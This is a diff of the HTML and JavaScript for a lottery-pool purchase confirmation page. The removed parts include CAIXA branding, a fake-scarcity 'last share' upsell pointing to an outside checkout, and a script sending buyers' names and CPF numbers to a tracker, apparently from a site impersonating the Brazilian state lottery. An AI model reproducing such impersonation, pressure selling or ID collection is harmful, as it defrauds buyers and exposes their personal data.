@@ -8,11 +8,8 @@
   <meta http-equiv="X-Frame-Options" content="DENY" />
   <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
 
-  <title>Obrigado - CAIXA</title>
+  <title>Obrigado - Compra Confirmada</title>
 
-  <!-- Preload recursos críticos -->
-  <link rel="preconnect" href="https://loteria.programaoficial.is" />
-  <link rel="dns-prefetch" href="https://loteria.programaoficial.is" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link
@@ -27,15 +24,6 @@
       rel="stylesheet"
     />
   </noscript>
-
-  <!-- CSS crítico inline para renderização imediata -->
-  <style>
-    body{margin:0;padding:0;font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background-color:#f8f9fa;padding-top:120px;min-height:100vh}
-    .header{background:linear-gradient(135deg,#005da8 0%,#004a8a 100%);padding:15px 20px;text-align:center;display:flex;align-items:center;justify-content:center;position:fixed;top:0;left:0;width:100%;height:120px;z-index:1000;box-shadow:0 4px 12px rgba(0,0,0,0.08)}
-    .logo{max-width:700px;height:auto;display:flex;align-items:center;justify-content:center}
-    .logo img{width:100%;height:auto;display:block;max-height:200px;object-fit:contain;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.2))}
-    .container{max-width:680px;width:100%;background-color:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);overflow:hidden;margin:0 auto}
-  </style>
 
   <!-- UTM Capture Script -->
   <script>
@@ -72,8 +60,8 @@
 
   <style>
     :root {
-      --cor-primaria: #005da8;
-      --cor-primaria-escura: #004a8a;
+      --cor-primaria: #0b5cab;
+      --cor-primaria-escura: #084a8c;
       --cor-secundaria: #f39200;
       --cor-sucesso: #2e7d32;
       --cor-sucesso-clara: #4CAF50;
@@ -110,7 +98,7 @@
       background-color:var(--cor-fundo);
       margin:0;
       min-height:100vh;
-      padding-top:120px;
+      padding-top:110px;
       padding-bottom:var(--espaco-4xl);
       -webkit-font-smoothing:antialiased;
       -moz-osx-font-smoothing:grayscale;
@@ -129,19 +117,50 @@
 
     .header{
       background:linear-gradient(135deg,var(--cor-primaria) 0%,var(--cor-primaria-escura) 100%);
-      padding:15px var(--espaco-lg);
+      padding:14px var(--espaco-lg);
       text-align:center;
       display:flex;
       align-items:center;
       justify-content:center;
       position:fixed;
-      top:0;left:0;width:100%;height:120px;
+      top:0;left:0;width:100%;height:110px;
       z-index:1000;
       box-shadow:var(--sombra-md)
     }
 
-    .logo{max-width:700px;display:flex;align-items:center;justify-content:center}
-    .logo img{width:100%;height:auto;display:block;max-height:200px;object-fit:contain;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.2))}
+    .brand{
+      width:100%;
+      max-width:680px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:12px;
+      color:#fff;
+    }
+    .brand-badge{
+      width:44px;height:44px;
+      border-radius:12px;
+      background:rgba(255,255,255,.18);
+      display:flex;align-items:center;justify-content:center;
+      font-weight:900;
+      box-shadow:0 8px 18px rgba(0,0,0,.12);
+      user-select:none;
+    }
+    .brand-title{
+      text-align:left;
+      line-height:1.1;
+    }
+    .brand-title strong{
+      display:block;
+      font-size:16px;
+      letter-spacing:.3px;
+    }
+    .brand-title span{
+      display:block;
+      font-size:12px;
+      opacity:.9;
+      margin-top:4px;
+    }
 
     .main-section{padding:var(--espaco-4xl) var(--espaco-3xl)}
 
@@ -158,13 +177,13 @@
 
     .titulo-principal{
       color:var(--cor-sucesso);
-      font-size:32px;font-weight:800;margin:0 0 var(--espaco-md);
+      font-size:30px;font-weight:800;margin:0 0 var(--espaco-md);
       text-align:center;letter-spacing:-.5px;line-height:1.2
     }
     .subtitulo{
       color:var(--cor-texto-secundario);
-      font-size:18px;margin-bottom:var(--espaco-3xl);
-      text-align:center;font-weight:400;line-height:1.5
+      font-size:16px;margin-bottom:var(--espaco-3xl);
+      text-align:center;font-weight:500;line-height:1.5
     }
 
     .confirmacao-box{
@@ -172,32 +191,32 @@
       border:2px solid var(--cor-sucesso-clara);
       border-radius:var(--raio-sm);
       padding:var(--espaco-2xl);
-      margin:var(--espaco-3xl) 0;
+      margin:var(--espaco-2xl) 0;
       text-align:center;
       box-shadow:0 2px 12px rgba(76,175,80,.15)
     }
-    .confirmacao-text{color:#1b5e20;font-weight:800;font-size:20px;margin-bottom:var(--espaco-sm)}
-    .confirmacao-subtext{color:var(--cor-sucesso);font-size:16px;font-weight:600;margin-top:var(--espaco-sm)}
+    .confirmacao-text{color:#1b5e20;font-weight:800;font-size:18px;margin-bottom:var(--espaco-sm)}
+    .confirmacao-subtext{color:var(--cor-sucesso);font-size:14px;font-weight:700;margin-top:var(--espaco-sm)}
 
     .info-pedido{
       background-color:var(--cor-fundo);
       border-radius:var(--raio-sm);
       padding:var(--espaco-xl);
-      margin:var(--espaco-2xl) 0;
+      margin:var(--espaco-xl) 0;
       box-shadow:var(--sombra-sm)
     }
-    .info-pedido h3{color:var(--cor-primaria);font-size:19px;margin-bottom:var(--espaco-lg);font-weight:800}
+    .info-pedido h3{color:var(--cor-primaria);font-size:18px;margin-bottom:var(--espaco-lg);font-weight:800}
     .info-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--espaco-md);padding:var(--espaco-sm) 0;border-bottom:1px solid #e9ecef}
     .info-row:last-child{margin-bottom:0;border-bottom:none}
-    .info-row .label{color:var(--cor-texto-secundario);font-size:14px;font-weight:600}
-    .info-row .value{color:var(--cor-texto);font-size:15px;font-weight:800}
+    .info-row .label{color:var(--cor-texto-secundario);font-size:13px;font-weight:700}
+    .info-row .value{color:var(--cor-texto);font-size:14px;font-weight:800}
 
     .mensagem-final{
       text-align:center;
       color:var(--cor-texto);
-      font-size:16px;
-      font-weight:600;
-      margin:var(--espaco-3xl) 0 var(--espaco-2xl);
+      font-size:15px;
+      font-weight:700;
+      margin:var(--espaco-xl) 0;
       line-height:1.6;
       padding:var(--espaco-xl);
       background-color:#fff3cd;
@@ -205,77 +224,27 @@
       border-radius:var(--raio-sm)
     }
 
-    /* Upsell */
-    .upsell-section{
-      background:linear-gradient(135deg,#fff5f5 0%,#ffe5e5 100%);
-      border:3px solid var(--cor-urgente);
-      border-radius:var(--raio-md);
-      padding:var(--espaco-2xl);
-      margin:var(--espaco-3xl) 0;
-      text-align:center;
-      box-shadow:0 4px 20px rgba(220,53,69,.2);
-      position:relative;
-      overflow:hidden
-    }
-    .upsell-section::before{content:'⚡';position:absolute;top:10px;right:10px;font-size:30px;animation:pulse 2s infinite}
-    @keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.8}}
-    .upsell-badge{display:inline-block;background:var(--cor-urgente);color:#fff;padding:var(--espaco-xs) var(--espaco-md);border-radius:20px;font-size:12px;font-weight:900;text-transform:uppercase;letter-spacing:1px;margin-bottom:var(--espaco-md)}
-    .upsell-title{color:var(--cor-urgente);font-size:24px;font-weight:900;margin-bottom:var(--espaco-sm);line-height:1.2}
-    .upsell-subtitle{color:var(--cor-texto);font-size:18px;font-weight:800;margin-bottom:var(--espaco-lg)}
-    .upsell-info{background:#fff;border-radius:var(--raio-sm);padding:var(--espaco-lg);margin:var(--espaco-lg) 0;box-shadow:var(--sombra-sm)}
-    .upsell-info-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--espaco-md);padding-bottom:var(--espaco-sm);border-bottom:1px solid #e9ecef}
-    .upsell-info-row:last-child{margin-bottom:0;border-bottom:none}
-    .upsell-info-label{color:var(--cor-texto-secundario);font-size:14px;font-weight:600}
-    .upsell-info-value{color:var(--cor-texto);font-size:16px;font-weight:900}
-
-    .upsell-dezenas{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin:var(--espaco-lg) 0}
-    .upsell-dezena{
-      width:40px;height:40px;display:flex;align-items:center;justify-content:center;
-      background:linear-gradient(135deg,var(--cor-primaria) 0%,var(--cor-primaria-escura) 100%);
-      color:#fff;border-radius:50%;
-      font-size:14px;font-weight:800;
-      box-shadow:0 2px 8px rgba(0,0,0,.15)
-    }
-
-    .upsell-price{display:flex;align-items:center;justify-content:center;gap:var(--espaco-md);margin:var(--espaco-lg) 0}
-    .upsell-price-old{color:var(--cor-texto-secundario);font-size:20px;text-decoration:line-through;font-weight:600}
-    .upsell-price-new{color:var(--cor-urgente);font-size:32px;font-weight:900}
-
-    .upsell-button{
-      background:linear-gradient(135deg,var(--cor-destaque) 0%,#ff4500 100%);
-      color:#fff;border:none;
-      padding:var(--espaco-lg) var(--espaco-2xl);
-      border-radius:50px;
-      font-size:18px;font-weight:900;
-      cursor:pointer;
-      width:100%;
-      margin-top:var(--espaco-lg);
-      box-shadow:0 4px 15px rgba(255,107,53,.4);
-      transition:all .2s ease;
-      text-transform:uppercase;
-      letter-spacing:.5px
-    }
-    .upsell-button:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,107,53,.5)}
-
-    /* ✅ NOVO: Botão “VER MEU BOLÃO” (estilo CAIXA / primário) */
     .primary-button{
       background:linear-gradient(135deg,var(--cor-primaria) 0%,var(--cor-primaria-escura) 100%);
       color:#fff;border:none;
       padding:16px 22px;
       border-radius:14px;
-      font-size:16px;font-weight:900;
+      font-size:15px;font-weight:900;
       cursor:pointer;
       width:100%;
-      box-shadow:0 10px 22px rgba(0,93,168,.25);
+      box-shadow:0 10px 22px rgba(11,92,171,.25);
       transition:transform .2s ease, box-shadow .2s ease;
       text-transform:uppercase;
       letter-spacing:.4px
     }
-    .primary-button:hover{transform:translateY(-2px);box-shadow:0 14px 28px rgba(0,93,168,.32)}
+    .primary-button:hover{transform:translateY(-2px);box-shadow:0 14px 28px rgba(11,92,171,.32)}
     .primary-button:active{transform:translateY(0)}
-    .primary-button[disabled]{opacity:.7;cursor:not-allowed;transform:none}
+    .primary-button[disabled]{opacity:.65;cursor:not-allowed;transform:none;box-shadow:none}
 
-    /* ✅ NOVO: Modal do bolão */
+    .help-link{text-align:center;margin-top:var(--espaco-md);padding-bottom:var(--espaco-sm)}
+    .help-link a{color:var(--cor-primaria);text-decoration:underline;font-size:14px}
+
+    /* Modal bolão */
     .bolao-modal-overlay{
       position:fixed;inset:0;
       background:rgba(0,0,0,.55);
@@ -304,7 +273,7 @@
       justify-content:space-between;
       gap:12px;
     }
-    .bolao-modal-title{font-size:16px;font-weight:900;letter-spacing:.3px}
+    .bolao-modal-title{font-size:15px;font-weight:900;letter-spacing:.3px}
     .bolao-modal-close{
       border:none;background:rgba(255,255,255,.18);
       color:#fff;
@@ -340,170 +309,42 @@
       background:linear-gradient(135deg,var(--cor-primaria) 0%,var(--cor-primaria-escura) 100%);
       color:#fff;
       font-weight:900;
-      box-shadow:0 6px 16px rgba(0,93,168,.28);
+      box-shadow:0 6px 16px rgba(11,92,171,.28);
       user-select:none;
     }
     .bolao-empty{
       text-align:center;
       color:var(--cor-texto-secundario);
-      font-weight:700;
+      font-weight:800;
       padding:10px 0 4px;
     }
 
-    .help-link{text-align:center;margin-top:var(--espaco-sm);padding-bottom:var(--espaco-sm)}
-    .help-link a{color:var(--cor-primaria);text-decoration:underline;font-size:14px}
-
     @media (max-width:600px){
-      body{padding-top:110px;padding-bottom:var(--espaco-2xl)}
-      .header{padding:10px var(--espaco-md);height:110px}
-      .logo{max-width:500px}
-      .logo img{max-height:160px}
+      body{padding-top:105px;padding-bottom:var(--espaco-2xl)}
+      .header{height:105px}
       .main-section{padding:var(--espaco-2xl) var(--espaco-lg)}
-      .success-icon{width:80px;height:80px}
-      .success-icon::before{font-size:50px}
       .titulo-principal{font-size:26px}
-      .subtitulo{font-size:16px}
+      .subtitulo{font-size:15px}
       .info-row{flex-direction:column;align-items:flex-start;gap:var(--espaco-xs)}
-      .upsell-dezena{width:35px;height:35px;font-size:12px}
-      .upsell-button{font-size:16px;padding:var(--espaco-md) var(--espaco-xl)}
     }
   </style>
 
-  <!-- UTMify UTMs Script -->
-  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" defer></script>
-
-  <!-- UTMify Tracking Script (mantido) -->
-  <script>
-    (function (window) {
-      'use strict';
-      const CONFIG = {
-        STORAGE_KEY: 'utm_data',
-        getPixelId: function () {
-          try { const storedPixelId = localStorage.getItem('utmify_pixel_id'); if (storedPixelId) return storedPixelId; } catch (e) {}
-          if (window.pixelId) return window.pixelId;
-          return '693235534e24ea4b926a9a07';
-        },
-        API_URL: 'https://tracking.utmify.com.br/tracking/v1/events'
-      };
-
-      function captureUtms() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
-        let newUtmData = {};
-        let hasUtms = false;
-
-        utmKeys.forEach(key => {
-          if (urlParams.has(key)) {
-            const value = urlParams.get(key);
-            if (value) {
-              const sanitized = String(value).replace(/[<>\"']/g, '').substring(0, 200);
-              if (sanitized) { newUtmData[key] = sanitized; hasUtms = true; }
-            }
-          }
-        });
-
-        if (hasUtms) {
-          newUtmData.createdAt = new Date().getTime();
-          localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(newUtmData));
-        }
-      }
-
-      window.getUtmData = function () {
-        try {
-          const stored = localStorage.getItem(CONFIG.STORAGE_KEY);
-          if (stored) {
-            const data = JSON.parse(stored);
-            const { createdAt, ...utms } = data;
-            return utms;
-          }
-        } catch (e) {}
-        return {};
-      };
-
-      window.sendUtmifyEvent = async function (eventType, extra = {}) {
-        const pixelId = CONFIG.getPixelId();
-        const utmData = window.getUtmData();
-
-        const lead = {
-          pixelId: pixelId,
-          ip: null,
-          email: extra.email || null,
-          name: extra.name || null,
-          phone: extra.phone || null
-        };
-
-        function mapEventType(type) {
-          if (type === 'Purchase') return 'sale';
-          if (type === 'Lead') return 'lead_prospect';
-          return type.toLowerCase();
-        }
-
-        const event = {
-          type: mapEventType(eventType),
-          pageTitle: extra.pageTitle || document.title,
-          sourceUrl: window.location.href,
-          value: extra.value || null,
-          status: extra.status || null,
-          payment_method: extra.payment_method || null,
-          external_id: extra.external_id || null,
-          gateway_transaction_id: extra.transaction_id || null,
-          metadata: { ...utmData, ...(extra.metadata || {}) }
-        };
-
-        const payload = { type: eventType, lead: lead, event: event };
-
-        try {
-          await fetch(CONFIG.API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-        } catch (error) {}
-      };
-
-      captureUtms();
-
-      const sendPurchase = () => {
-        setTimeout(function () {
-          if (window.sendUtmifyEvent) {
-            try {
-              const nome = String(localStorage.getItem('nome') || '').substring(0, 100).replace(/[<>\"']/g, '');
-              const cpf = String(localStorage.getItem('cpf') || '').replace(/[^0-9]/g, '').substring(0, 11);
-              const urlParams = new URLSearchParams(window.location.search);
-              const valorStr = urlParams.get('valor') || urlParams.get('amount') || '0';
-              const valor = Math.max(0, Math.min(parseFloat(valorStr) || 0, 999999.99));
-
-              window.sendUtmifyEvent('Purchase', {
-                pageTitle: 'Obrigado - Compra Confirmada',
-                value: valor,
-                status: 'completed',
-                name: nome || null,
-                metadata: { cpf: cpf || null }
-              });
-            } catch (e) {}
-          }
-        }, 500);
-      };
-
-      if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', sendPurchase);
-      } else {
-        sendPurchase();
-      }
-    })(window);
-  </script>
+  <!-- (Opcional) seu script UTMify existente, se você usa -->
+  <script src="js/latest.js" defer></script>
 </head>
 
 <body>
   <div class="container">
-    <!-- Cabeçalho CAIXA -->
     <div class="header">
-      <div class="logo">
-        <img id="logoImg" src="images/caixx.png" alt="CAIXA" loading="eager" fetchpriority="high" />
+      <div class="brand">
+        <div class="brand-badge">✓</div>
+        <div class="brand-title">
+          <strong>Compra confirmada</strong>
+          <span>Painel de Bolões</span>
+        </div>
       </div>
     </div>
 
-    <!-- Seção Principal -->
     <div class="main-section">
       <div class="success-icon"></div>
 
@@ -512,7 +353,7 @@
 
       <div class="confirmacao-box">
         <div class="confirmacao-text">PAGAMENTO CONFIRMADO</div>
-        <div class="confirmacao-subtext">Seus bilhetes estão garantidos!</div>
+        <div class="confirmacao-subtext">Seu bolão foi registrado neste dispositivo.</div>
       </div>
 
       <div class="info-pedido">
@@ -529,22 +370,11 @@
         </div>
 
         <div class="info-row">
-          <span class="label">Número do Concurso:</span>
-          <span class="value" id="numeroConcurso">2955</span>
-        </div>
-
-        <div class="info-row">
-          <span class="label">Data do Sorteio:</span>
-          <span class="value" id="dataSorteio">31/12/2025</span>
-        </div>
-
-        <div class="info-row">
           <span class="label">Data da Compra:</span>
           <span class="value" id="dataCompra"></span>
         </div>
       </div>
 
-      <!-- ✅ NOVO: Botão para ver o bolão comprado -->
       <div style="margin-top: 14px; margin-bottom: 8px;">
         <button class="primary-button" id="verBolaoBtn" type="button">
           VER MEU BOLÃO (DEZENAS)
@@ -552,48 +382,7 @@
       </div>
 
       <div class="mensagem-final">
-        <strong>Parabéns!</strong> Sua participação no bolão Mega da Virada foi confirmada.
-        Boa sorte no sorteio!
-      </div>
-
-      <div class="mensagem-final">
-        <strong>📦 Informação Importante:</strong> Em até 72 horas os bilhetes estão sendo emitidos e serão entregues no seu número de WhatsApp cadastrado. Fique atento às mensagens!
-      </div>
-
-      <!-- Oferta de Upsell -->
-      <div class="upsell-section">
-        <div class="upsell-badge">Última Vaga</div>
-        <h2 class="upsell-title">BOLÃO SECRETO - ÚLTIMA COTA!</h2>
-        <p class="upsell-subtitle">20 Dezenas - Valor Promocional</p>
-
-        <div class="upsell-info">
-          <div class="upsell-info-row">
-            <span class="upsell-info-label">Composição:</span>
-            <span class="upsell-info-value">1 Jogo com 20 Dezenas</span>
-          </div>
-          <div class="upsell-info-row">
-            <span class="upsell-info-label">Cotas Disponíveis:</span>
-            <span class="upsell-info-value" style="color: var(--cor-urgente);">ÚLTIMA COTA</span>
-          </div>
-          <div class="upsell-info-row">
-            <span class="upsell-info-label">Sorteio:</span>
-            <span class="upsell-info-value">31/12/2025</span>
-          </div>
-        </div>
-
-        <div class="upsell-dezenas">
-          <span class="upsell-dezena">02</span><span class="upsell-dezena">05</span><span class="upsell-dezena">08</span><span class="upsell-dezena">11</span><span class="upsell-dezena">14</span>
-          <span class="upsell-dezena">17</span><span class="upsell-dezena">20</span><span class="upsell-dezena">23</span><span class="upsell-dezena">26</span><span class="upsell-dezena">29</span>
-          <span class="upsell-dezena">32</span><span class="upsell-dezena">35</span><span class="upsell-dezena">38</span><span class="upsell-dezena">41</span><span class="upsell-dezena">44</span>
-          <span class="upsell-dezena">47</span><span class="upsell-dezena">50</span><span class="upsell-dezena">53</span><span class="upsell-dezena">56</span><span class="upsell-dezena">59</span>
-        </div>
-
-        <div class="upsell-price">
-          <span class="upsell-price-old">R$ 129,90</span>
-          <span class="upsell-price-new">R$ 68,90</span>
-        </div>
-
-        <button class="upsell-button" id="upsellButton">Garantir Última Cota Agora</button>
+        <strong>📌 Importante:</strong> as dezenas exibidas abaixo são as dezenas salvas no seu navegador no momento da compra.
       </div>
 
       <div class="help-link">
@@ -602,7 +391,7 @@
     </div>
   </div>
 
-  <!-- ✅ NOVO: Modal do bolão -->
+  <!-- Modal do bolão -->
   <div class="bolao-modal-overlay" id="bolaoModalOverlay" aria-hidden="true">
     <div class="bolao-modal" role="dialog" aria-modal="true" aria-labelledby="bolaoModalTitle">
       <div class="bolao-modal-header">
@@ -613,7 +402,7 @@
         <div class="bolao-meta" id="bolaoMeta"></div>
         <div class="bolao-grid" id="bolaoGrid"></div>
         <div class="bolao-empty" id="bolaoEmpty" style="display:none;">
-          Não encontramos seu bolão salvo. Finalize a compra pelo painel para registrar as dezenas.
+          Não encontramos um bolão salvo neste dispositivo. Volte ao painel e finalize uma compra para registrar as dezenas.
         </div>
       </div>
     </div>
@@ -632,10 +421,10 @@
       dataHora(data) {
         try {
           const date = data ? (data instanceof Date ? data : new Date(data)) : new Date();
-          if (isNaN(date.getTime())) return new Date().toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
-          return date.toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
+          if (isNaN(date.getTime())) throw new Error('data invalida');
+          return date.toLocaleString('pt-BR', { day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' });
         } catch (e) {
-          return new Date().toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'});
+          return new Date().toLocaleString('pt-BR', { day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' });
         }
       }
     };
@@ -656,67 +445,6 @@
       }
     };
 
-    const DOMManager = {
-      atualizar(id, conteudo) {
-        const el = document.getElementById(id);
-        if (el) el.textContent = String(conteudo || '');
-      }
-    };
-
-    function sanitizeValue(value) {
-      if (!value || typeof value !== 'string') return null;
-      return value.replace(/[<>\"']/g, '').substring(0, 200);
-    }
-
-    function adicionarUtmsAUrl(url) {
-      if (!url || typeof url !== 'string') return '#';
-      try {
-        const urlObj = new URL(url);
-        const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
-
-        const urlParams = new URLSearchParams(window.location.search);
-        let temUtms = false;
-
-        utmKeys.forEach(key => {
-          const value = urlParams.get(key);
-          if (value) {
-            const sanitized = sanitizeValue(value);
-            if (sanitized) { urlObj.searchParams.append(key, sanitized); temUtms = true; }
-          }
-        });
-
-        if (!temUtms) {
-          try {
-            const utmParams = localStorage.getItem('utmParams');
-            if (utmParams) {
-              const parsed = JSON.parse(utmParams);
-              utmKeys.forEach(key => {
-                if (parsed[key]) {
-                  const sanitized = sanitizeValue(String(parsed[key]));
-                  if (sanitized) urlObj.searchParams.append(key, sanitized);
-                }
-              });
-            } else {
-              const utmData = localStorage.getItem('utm_data');
-              if (utmData) {
-                const parsed = JSON.parse(utmData);
-                utmKeys.forEach(key => {
-                  if (parsed[key]) {
-                    const sanitized = sanitizeValue(String(parsed[key]));
-                    if (sanitized) urlObj.searchParams.append(key, sanitized);
-                  }
-                });
-              }
-            }
-          } catch (e) {}
-        }
-
-        return urlObj.toString();
-      } catch (e) {
-        return url;
-      }
-    }
-
     function carregarDados() {
       const dadosUsuario = StorageManager.getJSON('dadosUsuario', {}) || {};
       const nome = String(dadosUsuario.nome || StorageManager.get('nome', '') || '').substring(0, 120);
@@ -726,92 +454,59 @@
       const rowCpf = document.getElementById('rowCpf');
 
       if (nome) {
-        DOMManager.atualizar('nomeCliente', nome);
-        if (rowNome) rowNome.style.display = 'flex';
+        document.getElementById('nomeCliente').textContent = nome;
+        rowNome.style.display = 'flex';
       } else {
-        if (rowNome) rowNome.style.display = 'none';
+        rowNome.style.display = 'none';
       }
 
       if (cpf) {
-        DOMManager.atualizar('cpfCliente', Formatadores.cpf(cpf));
-        if (rowCpf) rowCpf.style.display = 'flex';
+        document.getElementById('cpfCliente').textContent = Formatadores.cpf(cpf);
+        rowCpf.style.display = 'flex';
       } else {
-        if (rowCpf) rowCpf.style.display = 'none';
+        rowCpf.style.display = 'none';
       }
 
-      DOMManager.atualizar('dataCompra', Formatadores.dataHora(new Date()));
+      document.getElementById('dataCompra').textContent = Formatadores.dataHora(new Date());
     }
 
     function mostrarAjuda() {
-      alert('Se você tiver alguma dúvida sobre sua compra, entre em contato conosco através dos canais de atendimento da CAIXA.');
+      alert('Se precisar, fale com o suporte do vendedor/organizador responsável pela sua compra.');
     }
 
-    function configurarBotaoUpsell() {
-      const botao = document.getElementById('upsellButton');
-      if (!botao) return;
-      botao.addEventListener('click', function (e) {
-        e.preventDefault();
-        const urlSegura = adicionarUtmsAUrl('https://www.pay-pagamentos.link/checkout/755d473e-d843-4449-b873-2b109fa0f49e');
-        if (urlSegura && urlSegura !== '#') window.location.href = urlSegura;
-      });
-    }
-
-    function verificarLogo() {
-      const logoImg = document.getElementById('logoImg');
-      if (!logoImg) return;
-
-      const fallbackSvg = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0MDAgMTIwIiBmaWxsPSJub25lIj48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtZmFtaWx5PSJJbnRlciwgQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNjAiIGZvbnQtd2VpZ2h0PSI4MDAiIGxldHRlci1zcGFjaW5nPSIzIj5DQUlYQTwvdGV4dD48L3N2Zz4=';
-
-      const testImg = new Image();
-      testImg.onload = function () {
-        if (logoImg.src !== 'https://loteria.programaoficial.is/imagem/caixx.png') {
-          logoImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png';
-        }
-      };
-      testImg.onerror = function () {
-        setTimeout(function () {
-          logoImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png?t=' + Date.now();
-          logoImg.onerror = function () { logoImg.src = fallbackSvg; };
-        }, 500);
-      };
-      testImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png';
-
-      setTimeout(function () {
-        if (!logoImg.complete || logoImg.naturalHeight === 0) {
-          if (logoImg.src.indexOf('data:image') === -1) {
-            logoImg.src = 'https://loteria.programaoficial.is/imagem/caixx.png?t=' + Date.now();
-            logoImg.onerror = function () { logoImg.src = fallbackSvg; };
-          }
-        }
-      }, 2500);
+    function safeText(s) {
+      return String(s || '').replace(/[<>\"']/g, '').substring(0, 200);
     }
 
     /* ==========================================================
-       ✅ NOVO: “VER MEU BOLÃO” (puxa dezenas do localStorage)
-       Estrutura esperada no localStorage:
-       boloesComprados: [
-         { id:'bolao3', title:'Bolão Especial', dezenas:['01','05',...], ts: 1700000000000 }
-       ]
+      VER MEU BOLÃO
+      Compatível com:
+        - ultimoBolaoComprado (novo)
+        - ultimaCompraBolao (antigo/fallback)
+        - boloesComprados (histórico)
+      Também aceita ?bolao=ID pela URL
     ========================================================== */
-
-    function getBolaoCompradoPreferencial() {
-      // 1) tenta URL ?bolao=bolao3
+    function getBolaoPreferencial() {
       const qp = new URLSearchParams(window.location.search);
       const bolaoParam = qp.get('bolao');
-      const boloesComprados = StorageManager.getJSON('boloesComprados', []) || [];
-      const ultimaCompra = boloesComprados.length ? boloesComprados[boloesComprados.length - 1] : null;
 
-      if (bolaoParam && boloesComprados.length) {
-        const found = boloesComprados.find(b => String(b.id) === String(bolaoParam));
-        if (found) return found;
+      const ultimoNovo = StorageManager.getJSON('ultimoBolaoComprado', null);
+      if (ultimoNovo && Array.isArray(ultimoNovo.dezenas) && ultimoNovo.dezenas.length) {
+        if (!bolaoParam || String(ultimoNovo.id) === String(bolaoParam)) return ultimoNovo;
       }
 
-      // 2) tenta ultima compra
-      if (ultimaCompra) return ultimaCompra;
+      const historico = StorageManager.getJSON('boloesComprados', []) || [];
+      if (historico.length) {
+        if (bolaoParam) {
+          const found = historico.find(b => String(b.id) === String(bolaoParam));
+          if (found && Array.isArray(found.dezenas) && found.dezenas.length) return found;
+        }
+        const last = historico[historico.length - 1];
+        if (last && Array.isArray(last.dezenas) && last.dezenas.length) return last;
+      }
 
-      // 3) tenta “ultimaCompraBolao” (fallback)
       const fallback = StorageManager.getJSON('ultimaCompraBolao', null);
-      if (fallback && fallback.dezenas && Array.isArray(fallback.dezenas)) return fallback;
+      if (fallback && Array.isArray(fallback.dezenas) && fallback.dezenas.length) return fallback;
 
       return null;
     }
@@ -823,30 +518,27 @@
       const meta = document.getElementById('bolaoMeta');
       const empty = document.getElementById('bolaoEmpty');
 
-      if (!overlay || !grid || !meta || !empty) return;
-
-      // limpar
       grid.innerHTML = '';
       meta.innerHTML = '';
       empty.style.display = 'none';
 
-      const bolao = getBolaoCompradoPreferencial();
+      const bolao = getBolaoPreferencial();
 
-      if (!bolao || !bolao.dezenas || !Array.isArray(bolao.dezenas) || bolao.dezenas.length === 0) {
+      if (!bolao || !Array.isArray(bolao.dezenas) || bolao.dezenas.length === 0) {
         empty.style.display = 'block';
       } else {
-        const id = String(bolao.id || '—');
+        const id = safeText(bolao.id || '—');
         const qtd = bolao.dezenas.length;
         const ts = bolao.ts ? new Date(bolao.ts) : null;
 
         const meta1 = document.createElement('div');
-        meta1.innerHTML = `<strong>Bolão:</strong> <span>${id.replace(/[<>\"']/g,'')}</span>`;
+        meta1.innerHTML = `<strong>Bolão:</strong> <span>${id}</span>`;
 
         const meta2 = document.createElement('div');
         meta2.innerHTML = `<strong>Dezenas:</strong> <span>${qtd}</span>`;
 
         const meta3 = document.createElement('div');
-        meta3.innerHTML = `<strong>Compra:</strong> <span>${ts ? ts.toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '—'}</span>`;
+        meta3.innerHTML = `<strong>Registro:</strong> <span>${ts ? ts.toLocaleString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '—'}</span>`;
 
         meta.appendChild(meta1);
         meta.appendChild(meta2);
@@ -868,11 +560,8 @@
         overlay.setAttribute('aria-hidden', 'true');
       };
 
-      overlay.addEventListener('click', function (e) {
-        if (e.target === overlay) close();
-      }, { once: true });
-
-      if (closeBtn) closeBtn.addEventListener('click', close, { once: true });
+      overlay.onclick = (e) => { if (e.target === overlay) close(); };
+      closeBtn.onclick = close;
 
       document.addEventListener('keydown', function escHandler(e) {
         if (e.key === 'Escape') {
@@ -885,24 +574,26 @@
     function configurarBotaoVerBolao() {
       const btn = document.getElementById('verBolaoBtn');
